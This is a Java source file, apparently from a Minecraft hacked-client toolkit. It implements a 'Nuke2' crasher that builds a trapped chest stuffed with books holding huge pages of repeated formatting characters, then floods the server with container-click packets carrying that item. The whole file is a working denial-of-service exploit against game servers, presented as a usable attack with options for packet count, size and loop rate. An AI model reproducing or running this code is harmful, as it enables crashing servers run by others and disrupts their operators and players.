package us.whitedev.crashers.impl;

import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Optional;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.nbt.StringTag;
import net.minecraft.network.protocol.game.ServerboundContainerClickPacket;
import net.minecraft.world.inventory.ClickType;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import org.jetbrains.annotations.NotNull;
import us.whitedev.crashers.Crasher;
import us.whitedev.helpers.PacketHelper;
import us.whitedev.utils.OptionType;
import us.whitedev.utils.OptionUtil;

public class Nuke2 implements Crasher {
    private static final String METHOD_NAME = "Nuke2";
    private boolean enabled = false;
    private ScheduledExecutorService executorService;

    public Nuke2() {
    }

    public void onMethod(String[] args) {
        int packets = Integer.parseInt(args[2]);
        int size = Integer.parseInt(args[3]);
        int amount = Integer.parseInt(args[4]);
        int scales = Integer.parseInt(args[5]);
        String type = args[6].toLowerCase(Locale.ROOT);
        long threadSleep = Long.parseLong(args[7]);
        int loopAmount = Integer.parseInt(args[8]);
        this.setEnabled(true);
        msgHelper.sendMessage("Starting crashing with &f" + this.getName(), true);
        if (this.executorService != null && !this.executorService.isShutdown()) {
            this.executorService.shutdownNow();
            msgHelper.sendMessage("Previous attack &cstopped&7!", true);
        }

        ItemStack is = getChestStack(size, amount, scales, type);
        Int2ObjectMap<ItemStack> int2objectmap = new Int2ObjectOpenHashMap();
        AtomicInteger check = new AtomicInteger(0);
        this.executorService = Executors.newSingleThreadScheduledExecutor();
        Runnable clickTask = () -> {
            for(int i = 0; i < packets; ++i) {
                if (!this.enabled || check.get() == loopAmount) {
                    this.executorService.shutdown();
                    this.setEnabled(false);
                    msgHelper.sendMessage("Attack &asuccessful &7finished!", true);
                    break;
                }

                PacketHelper.send(new ServerboundContainerClickPacket(0, 0, 20, 0, ClickType.QUICK_MOVE, is, int2objectmap));
            }

            check.getAndIncrement();
        };
        this.executorService.scheduleAtFixedRate(clickTask, 0L, threadSleep, TimeUnit.MILLISECONDS);
    }

    private static @NotNull ItemStack getChestStack(int size, int amount, int scales, String type) {
        StringTag pageTag = new StringTag("§".repeat(size));
        ListTag pagesTag = new ListTag();

        for(int i = 0; i < amount; ++i) {
            pagesTag.add(pageTag);
        }

        CompoundTag bookTag = new CompoundTag();
        bookTag.put("pages", pagesTag);
        bookTag.putString("author", "madeq");
        bookTag.putString("title", "sigma");
        ListTag chestItemsTag = new ListTag();

        for(int i = 0; i <= scales; ++i) {
            CompoundTag itemTag = new CompoundTag();
            itemTag.putByte("Slot", (byte)i);
            if (type.equals("default")) {
                itemTag.putString("id", "minecraft:writable_book");
            } else {
                itemTag.putString("id", "minecraft:written_book");
            }

            itemTag.putByte("Count", (byte)1);
            itemTag.put("tag", bookTag);
            chestItemsTag.add(itemTag);
        }

        CompoundTag blockEntityTag = new CompoundTag();
        blockEntityTag.put("Items", chestItemsTag);
        CompoundTag chestTag = new CompoundTag();
        chestTag.put("BlockEntityTag", blockEntityTag);
        return new ItemStack(Items.TRAPPED_CHEST, 1, Optional.of(chestTag));
    }

    public String getName() {
        return "Nuke2";
    }

    public boolean getEnabled() {
        return this.enabled;
    }

    public void setEnabled(boolean bool) {
        this.enabled = bool;
    }

    public List<OptionUtil> getOptions() {
        return List.of(new OptionUtil("Packets", OptionType.INTEGER), new OptionUtil("Size", OptionType.INTEGER), new OptionUtil("Amount", OptionType.INTEGER), new OptionUtil("Scales", OptionType.INTEGER), new OptionUtil("Type", OptionType.LIST, new String[]{"Default", "Saved"}), new OptionUtil("Thread Sleep", OptionType.INTEGER), new OptionUtil("Loop Amount", OptionType.INTEGER));
    }

    public String getArgsUsage() {
        return "packets[10], size[100], amount[100], scales[100], type[default], sleep[100], loops[10]";
    }

    public String getDescription() {
        return "Transformer Flood Crasher";
    }
}
